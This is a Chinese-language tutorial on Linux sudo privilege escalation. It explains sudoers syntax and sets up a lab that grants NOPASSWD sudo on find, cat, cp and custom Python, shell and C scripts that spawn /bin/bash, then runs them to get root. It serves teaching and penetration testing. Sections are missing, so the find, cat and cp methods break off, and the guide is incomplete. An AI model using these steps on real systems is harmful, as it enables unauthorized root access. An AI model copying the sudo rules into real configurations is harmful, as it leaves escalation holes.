1、简介

在Linux/Unix中，/etc中的 sudoers 文件是 sudo 权限的配置文件。sudo 这个词代表着Super User Do root权限。Sudoers 文件是存储具有 root 权限的用户和组，以 root 或其他用户身份运行部分或所有命令的文件。

2、Sudo语法配置

如果root 用户希望向任何特定用户授予 sudo 权限，则键入visudo命令，该命令将打开 sudoers 文件进行编辑。

    • ✅(ALL:ALL) 也可以表示为 (ALL)

    • ✅如果找到 (root) 代替 (ALL:ALL) 则表示用户可以以 root 身份运行该命令。

    • ✅如果没有提及用户/组，则意味着 sudo 默认为 root 用户

配置示例：willing ALL=(root) NOPASSWD:/bin/cp

3、Sudo提权方法

3.1 CP Cat Find提权

1.环境配置

1.编辑sudo配置文件

vim /etc/sudoers
willing ALL=(root) NOPASSWD: /usr/bin/find,/usr/bin/cat,/usr/bin/cp

2.检测sudo权限

sudo -l

2.Find提权

1.查看sudo权限

3.4 root权限shell脚本

获得系统或程序调用的任何类型脚本的可能性最大，可以是 Bash、PHP、Python 或 C 语言脚本中的任何脚本，假设想要为任何将在执行时提供 bash shell 的脚本授予 sudo 权限。

1.环境配置

1.配置shell.py

mkdir /bin/scripts
vim /bin/scripts/shell.py
chmod u+x /bin/scripts/shell.py
#! /usr/bin/python

import os
os.system("/bin/bash")

2.配置shell.sh

vim /bin/scripts/shell.sh
#!/bin/bash

/bin/bash

3.配置shell.c

vim shell.c
#include<stdio.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main()
{
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}

4.编译shell.c文件

gcc shell.c -o /bin/scripts/shell
chmod 777 /bin/scripts/shell
chmod a+x /bin/scripts/shell.py
chmod a+x /bin/scripts/shell.sh

5.配置sudo文件

willing ALL=(root) NOPASSWD: /bin/scripts/shell.py,/bin/scripts/shell.sh,/bin/scripts/shell

6.查看sudo配置

2.shell.py提权

sudo /bin/scripts/shell.py

3.shell.sh提权

sudo /bin/scripts/shell.sh

4.shell提权

sudo /bin/scripts/shell
